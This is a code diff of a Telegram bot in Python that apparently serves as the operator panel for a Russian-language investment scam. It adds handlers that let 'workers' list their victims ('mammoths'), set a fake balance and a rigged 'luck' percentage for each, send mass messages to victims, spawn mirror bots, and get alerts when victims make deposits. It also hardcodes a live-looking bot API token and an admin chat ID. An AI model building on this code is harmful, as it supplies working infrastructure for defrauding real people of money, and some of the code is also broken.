@@ -1,6 +1,6 @@
 import asyncio
 import logging
-import time
+from datetime import timedelta, datetime
 import json
 from  aws import sns, aws_region, aws_access_key_id, aws_secret_access_key
 import aiobotocore as aiobotocore
@@ -13,7 +13,9 @@ from aiogram.types import ParseMode, InlineKeyboardButton, InlineKeyboardMarkup,
 from aiogram.dispatcher.filters.state import State, StatesGroup
 from db import Worker, session, Mammoth
 from img import generate_profile_stats_for_worker
+from test import create_mirror
 from aiobotocore.session import get_session
+import requests
 admin_chat_id  = '881704893'
 API_TOKEN = '6686215620:AAHPv-qUVFsAKH4ShiaGNfZWd0fHVYCX2qg'
 from aws import  sqs
@@ -24,10 +26,114 @@ dp = Dispatcher(bot)
 dp.middleware.setup(LoggingMiddleware())
 
 
-async def process_sqs_messages():
-    session = get_session()
 
-    async with session.create_client( service_name = 'sqs',
+def mammont_management_buttons(mammonth_id):
+    kb = InlineKeyboardMarkup()
+    mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == mammonth_id).first()
+    kb.add(InlineKeyboardButton(f'Удача {mammonth.luck}%', callback_data=json.dumps({'change_luck':mammonth_id})))
+    kb.add(InlineKeyboardButton('Баланс', callback_data=json.dumps({'change_balance':mammonth_id})))
+    kb.add((InlineKeyboardButton('Статистика', callback_data=json.dumps({'show_stats':mammonth_id}))))
+    return  kb
+all_mammonts = session.query(Mammoth).all()
+
+class DistributeStates(StatesGroup):
+    first = State()
+
+@dp.callback_query_handler(lambda callback_query: callback_query.data=='distribute')
+async def handle_mammonths_distribute(query:types.CallbackQuery):
+    await DistributeStates.first.set()
+    
+    await query.message.answer('Введите сообщение для рассілки')
+
+@dp.message_handler(state=DistributeStates.first)
+async def handle_distribution(message: types.Message, state: FSMContext):
+    workers_mammonts = session.query(Mammoth).filter(Mammoth.belongs_to_worker == message.from_user.id).all()
+    worker = session.query(Worker).filter(Worker.telegram_id == message.from_user.id).first()
+    for mammonth in workers_mammonts:
+        data = {'chat_id':mammonth.telegram_id, 'text':message.text}
+        requests.post(url = f'https://api.telegram.org/bot{worker.token}/sendMessage')
+    await state.finish()
+
+
+@dp.message_handler(lambda message:message.text.startswith('/t'))
+async def get_info_about_mammonth(message: types.Message):
+    mammonth_service_id = message.text.split('t')[1]
+    mammonth = session.query(Mammoth).filter(Mammoth.service_id == mammonth_service_id).first()
+    if mammonth:
+
+        template = f'''
+💙 Мамонт с ID *{mammonth.service_id}* 
+
+Telegram ID: `{mammonth.telegram_id}`
+ID мамонта: *t{mammonth.service_id}*
+Имя: {mammonth.first_name}
+
+Баланс: {mammonth.balance}₽
+На выводе: {mammonth.on_output} ₽
+Валюта: RUB
+    '''
+        await message.answer(template, parse_mode=ParseMode.MARKDOWN, reply_markup=mammont_management_buttons(message.from_user.id))
+
+
+@dp.callback_query_handler(lambda callback_query: callback_query.data.startswith('{"show_stats":'))
+async def handle_mammonth_show_stats(query:types.CallbackQuery):
+    mammonth_telegram_id = json.loads(query.data)['show_stats']
+    mamonth = session.query(Mammoth).filter(Mammoth.telegram_id == mammonth_telegram_id).first()
+    template = f'''
+🖤 Статистика мамонта *t{mamonth.service_id}* _{mamonth.first_name}_
+
+Удачных сделок: *{mamonth.succesful_deals}*
+Неудачных сделок: *{mamonth.deals - mamonth.succesful_deals}*
+Общая прибыль: *{mamonth.profit}*₽ 
+    
+    
+    '''
+    await query.message.answer(template, parse_mode=ParseMode.MARKDOWN)
+
+@dp.callback_query_handler(lambda callback_query: callback_query.data.startswith('{"change_luck":'))
+async def handle_change_luck_mammonth(query:types.CallbackQuery):
+    button = query.message.reply_markup.inline_keyboard[0][0]
+
+    mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == json.loads(query.data)['change_luck']).first()
+    if mammonth.luck == 100:
+        mammonth.luck = 0
+    else:
+        mammonth.luck += 25
+    session.commit()
+    button.text = f'Удача {mammonth.luck}%'
+
+    # Обновляем сообщение, чтобы применить изменения
+    await query.message.edit_reply_markup(reply_markup=query.message.reply_markup)
+
+class Change_mammonths_balance(StatesGroup):
+    first = State()
+
+@dp.callback_query_handler(lambda callback_query: callback_query.data.startswith('{"change_balance":'))
+async def handle_change_balance_mammonth(query:types.CallbackQuery):
+    state = dp.current_state(chat=query.message.chat.id, user=query.from_user.id)
+    data = dict()
+    data['id'] = json.loads(query.data)['change_balance']
+    await  state.set_data(data)
+    await Change_mammonths_balance.first.set()
+    await query.answer('Введите желаемую сумму баланса мамонта')
+
+@dp.message_handler(state=Change_mammonths_balance.first)
+async def change_balance(message: types.Message, state: FSMContext):
+    data = await state.get_data()
+    mammonth_telegram_id =data['id']
+    mamonth = session.query(Mammoth).filter(Mammoth.telegram_id == mammonth_telegram_id ).first()
+    try:
+        mamonth.balance = float(message.text)
+        session.commit()
+        await message.answer("Баланс успешно изменен!")
+    except Exception as ex:
+        await message.answer('Введите корректное число')
+    await  state.finish()
+
+async def process_sqs_messages():
+    session_aws = get_session()
+
+    async with session_aws.create_client( service_name = 'sqs',
     aws_access_key_id=aws_access_key_id,
     aws_secret_access_key=aws_secret_access_key,
     region_name=aws_region) as sqs:
@@ -40,16 +146,41 @@ async def process_sqs_messages():
                 VisibilityTimeout=0,
                 WaitTimeSeconds=0
             )
+            response_for_deals = await sqs.receive_message(
+                QueueUrl='https://sqs.eu-north-1.amazonaws.com/441199499768/NewApplicationsOnBid',
+                AttributeNames=['All'],
+                MaxNumberOfMessages=1,
+                MessageAttributeNames=['All'],
+                VisibilityTimeout=0,
+                WaitTimeSeconds=0
+
+
+            )
+            try:
+                diction_for_deals = response_for_deals['Messages'][0]['Body']
+                msg_attributes = (json.loads(diction_for_deals).get('MessageAttributes'))
+                MammonthTelegramId = json.loads(diction_for_deals).get('MammonthTelegramId')
+                Amount = json.loads(diction_for_deals).get('Amount')
+                mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == MammonthTelegramId).first()
+                if Amount < 0:
+                    await  bot.send_message(mammonth.belongs_to_worker, f'{mammonth.name} совершил неприбыльную сделку и потерял {Amount} RUB')
+                else:
+                    await  bot.send_message(mammonth.belongs_to_worker, f'{mammonth.name} совершил прибыльную сделку и получил {Amount} RUB')
+            except Exception as ex:
+                print(ex)
+
             try:
                 diction = response['Messages'][0]['Body']
                 msg_attributes = (json.loads(diction).get('MessageAttributes'))
                 print(msg_attributes)
+                print(msg_attributes['MammonthId']['Value'])
+                print(msg_attributes['Sum']['Value'])
                 await bot.send_message(
                     int(msg_attributes['WorkerId']['Value']),
                     f'''💹 Новая заявка на пополнение! (Трейдинг)
                     
 
-🐘 Мамонт: {msg_attributes['FirstName']['Value']} [/t138806]!!
+🐘 Мамонт: {msg_attributes['FirstName']['Value']} [/{msg_attributes['MammonthId']['Value']}]!!
 💳 Сумма: {msg_attributes['Sum']['Value']} RUB
                 ''', reply_markup=create_top_up_mammonths_balance_button(mammonths_telegram_id=msg_attributes['MammonthId']['Value'], amount=msg_attributes['Sum']['Value'])
                 )
@@ -59,6 +190,7 @@ async def process_sqs_messages():
 
             except Exception as ex:
                 print(ex)
+                print('!!!!!!')
             await asyncio.sleep(10)
 
 
@@ -67,12 +199,21 @@ class QuestionsAndAnswersStates(StatesGroup):
     second = State()
     third = State()
 
+
+class create_mirror_bot_states(StatesGroup):
+    first = State()
+    second = State()
+
+
+
 def admin_approval_button():
     return InlineKeyboardMarkup().add(InlineKeyboardButton("Разрешить воркеру создать аккаунт", callback_data='approvetocreateaccount'), InlineKeyboardButton(
         'Запретить', callback_data='disapprovetocreateaccount'))
 
 
-
+def create_button_how_to_input_token():
+    url = 'https://telegra.ph/Kak-sdelat-token-dlya-zerkala-04-07'
+    return InlineKeyboardMarkup().add(InlineKeyboardButton("Как создать токен?", url=url))
 
 def create_agree_button():
     return InlineKeyboardMarkup().add(InlineKeyboardButton('Согласен с правилами', callback_data='agreewithterms'))
@@ -82,7 +223,16 @@ def create_verification_button():
     return InlineKeyboardMarkup().add(InlineKeyboardButton('Проверить верификацию', callback_data='verifyThatUserIsNotUkrainian'))
 
 def create_top_up_mammonths_balance_button(mammonths_telegram_id, amount):
-    return InlineKeyboardMarkup().add(InlineKeyboardButton('Пополнить', callback_data='top_up_mammonths_balance', mammonths_telegram_id=mammonths_telegram_id, amount=amount))
+    print(json.dumps({'mammonths_telegram_id' : mammonths_telegram_id, 'amount':amount}))
+    return InlineKeyboardMarkup().add(InlineKeyboardButton('Пополнить', callback_data=json.dumps({'mammonths_telegram_id' : mammonths_telegram_id, 'amount':amount})))
+
+
+def after_mamonts_management():
+    kb = InlineKeyboardMarkup()
+    kb.add(InlineKeyboardButton('Мои мамонты', callback_data='my_mammonts'))
+    kb.add(InlineKeyboardButton('Массовая рассылка', callback_data='distribute'))
+    kb.add(InlineKeyboardButton('Настройки', callback_data='mammonts_settings'))
+    return kb
 
     # Создаем клавиатуру
 markup = ReplyKeyboardMarkup(resize_keyboard=True)
@@ -100,10 +250,12 @@ markup.add(profile_button, nft_button, trading_button)
 markup.add(casino_button, arbitrage_button, about_button)
 
 
-
-
-
-
+def create_markup_for_trading():
+    markup_for_trading = InlineKeyboardMarkup()
+    markup_for_trading.add(InlineKeyboardButton('Управление мамонтам', callback_data='mammonths_management'))
+    markup_for_trading.add(InlineKeyboardButton('Создать зеркало бота', callback_data='create_mirror'))
+    markup_for_trading.add(InlineKeyboardButton('Минималка', callback_data='minimal_amount'))
+    return markup_for_trading
 @dp.message_handler(lambda message: message.text in ["Профиль 🐳", "NFT 💠", "Трейдинг 📊", "Казино 🎰", "Арбитраж 🌐", "О проекте 👨‍💻"])
 async def handle_menu(message: types.Message):
     # Обработка нажатия кнопок
@@ -112,7 +264,20 @@ async def handle_menu(message: types.Message):
     elif message.text == "NFT 💠":
         await message.answer("Вы выбрали 'NFT 💠'")
     elif message.text == "Трейдинг 📊":
-        await message.answer("Вы выбрали 'Трейдинг 📊'")
+        service_id=session.query(Worker).filter(Worker.telegram_id==message.from_user.id).first().service_id
+        template =f'''
+📊 Трейдинг
+
+📋 Ваш код: `{service_id}`
+
+💳 Ваши фейк реквизиты: ???
+
+🔗 Ваша реферальная ссылка:&&)
+        
+        
+        
+        '''
+        await message.answer(template, reply_markup=create_markup_for_trading(), parse_mode=ParseMode.MARKDOWN)
     elif message.text == "Казино 🎰":
         await message.answer("Вы выбрали 'Казино 🎰'")
     elif message.text == "Арбитраж 🌐":
@@ -123,22 +288,22 @@ async def handle_menu(message: types.Message):
 
 async def showprofile(message: types.Message):
     worker = session.query(Worker).filter(Worker.telegram_id == message.from_user.id).first()
-    generate_profile_stats_for_worker(str(worker.telegram_id), str(worker.balance), str(worker.profit), str(worker.warnings), worker.payment_method )
+    await generate_profile_stats_for_worker(str(worker.telegram_id), str(worker.balance), str(worker.profit), str(worker.warnings), worker.payment_method )
     caption = f"""
 🗃 Твой профиль [{worker.telegram_id}],  0 уровень!
 
-Код для сервисов: 62954612!
+Код для сервисов: {worker.service_id}!
 
-💸 У тебя 0! профитов на сумму {worker.profit} RUB
+💸 У тебя {worker.profit_quantity} профитов на сумму {worker.profit} RUB
 Средний профит 0 RUB
 
-Приглашено: 0 воркеров!
+Приглашено: {len(worker.mammonts)} воркеров
 Баланс: {worker.balance} RUB
 Статус: Воркер
 Предупреждений: [{worker.warnings}/3]
 Способ выплаты: {worker.payment_method}
 
-В команде: 2 дня
+В команде: {(datetime.utcnow() - worker.created_at).days+1} день/дня
 
 🌕 Всё работает, воркаем!
     
@@ -174,7 +339,12 @@ async def send_welcome(message: types.Message):
 
         await  message.answer('⚡', reply_markup=markup)
         msg = await message.reply(rules_text, parse_mode=ParseMode.MARKDOWN, reply_markup=create_agree_button())
-    await showprofile(message)
+        loop = asyncio.get_event_loop()
+        loop.run_until_complete(await process_sqs_messages())
+    else:
+        await showprofile(message)
+        loop = asyncio.get_event_loop()
+        loop.run_until_complete(await process_sqs_messages())
 
 @dp.callback_query_handler(lambda callback_query: callback_query.data == 'agreewithterms')
 async def handle_agree_callback(query: types.CallbackQuery):
@@ -183,6 +353,52 @@ async def handle_agree_callback(query: types.CallbackQuery):
                         "1. У вас есть опыт работы в такой сфере? (Да/Нет)")
     # Устанавливаем состояние ожидания ответа на первый вопрос
     await QuestionsAndAnswersStates.first.set()
+
+
+@dp.callback_query_handler(lambda callback_query: callback_query.data == 'create_mirror')
+async def create_mirror_handler(query: types.CallbackQuery):
+
+
+
+    await create_mirror_bot_states.first.set()
+    await query.message.answer('Введите токен бота', reply_markup=create_button_how_to_input_token())
+
+
+@dp.callback_query_handler(lambda callback_query: callback_query.data == 'my_mammonts' )
+async def my_mammonts_handler(query: types.CallbackQuery):
+    worker = session.query(Worker).filter(Worker.telegram_id ==  query.from_user.id  ).first()
+    template = 'Ваши маммонты'
+    from aiogram.types import  User
+    mammonts = worker.mammonts.split(',')[:-1]
+    for mammont in mammonts:
+        mammont_from_db = session.query(Mammoth).filter(Mammoth.telegram_id == mammont).first()
+
+        template += f'''
+У тебя {len(mammonts)} мамонт/мамонта
+(/t{mammont_from_db.service_id}) - {mammont_from_db.first_name} - *{mammont_from_db.balance}*, Фарт - {mammont_from_db.luck}
+'''
+    await query.message.answer(template, parse_mode=ParseMode.MARKDOWN)
+@dp.message_handler(state=create_mirror_bot_states.first)
+async def create_mirror_states_first_handler(message: types.Message, state: FSMContext):
+    worker = session.query(Worker).filter(Worker.telegram_id == message.from_user.id).first()
+
+    async with state.proxy() as data:
+        data['mirror_bot_token'] = message.text
+    await state.finish()
+    import threading
+    mirror_bot_thread =  threading.Thread(target=create_mirror, args=(message.text, message.from_user.id))
+    mirror_bot_thread.start()
+
+    await message.reply("Создание зеркала завершено! Токен зеркального бота: " + '_message.text_')
+    worker.token = message.text
+    session.commit()
+@dp.callback_query_handler(lambda callback_query:callback_query.data=='mammonths_management')
+async def mammonts_management_handler(query:types.CallbackQuery):
+    worker_id = query.message.from_user.id
+
+    await query.message.delete()
+    await query.message.answer( '📊 Выберите *действие*', reply_markup=after_mamonts_management(), parse_mode=ParseMode.MARKDOWN)
+
 
 
 @dp.message_handler(state=QuestionsAndAnswersStates.first)
@@ -219,8 +435,11 @@ async def answer3(message: types.Message, state: FSMContext):
     await state.finish()
 
 
-@dp.callback_query_handler(lambda callback_query: callback_query.data == 'top_up_mammonths_balance')
-async def handle_top_up_mammonths_balance(query: types.CallbackQuery, mammonths_telegram_id, amount):
+@dp.callback_query_handler(lambda callback_query: callback_query.data.startswith('{"mammonths_telegram_id":'))
+async def handle_top_up_mammonths_balance(query: types.CallbackQuery):
+    data = json.loads(query.data)
+    mammonths_telegram_id = int(data['mammonths_telegram_id'])
+    amount = int(data['amount'])
     mammonth = session.query(Mammoth).filter(Mammoth.telegram_id==mammonths_telegram_id).first()
     mammonth.balance += amount
     session.commit()
@@ -251,8 +470,7 @@ async def handle_approve_callback(query: types.CallbackQuery):
 
 
 if __name__ == '__main__':
-    loop = asyncio.get_event_loop()
-    loop.run_until_complete(process_sqs_messages())
+
     from aiogram import executor
 
     storage = MemoryStorage()
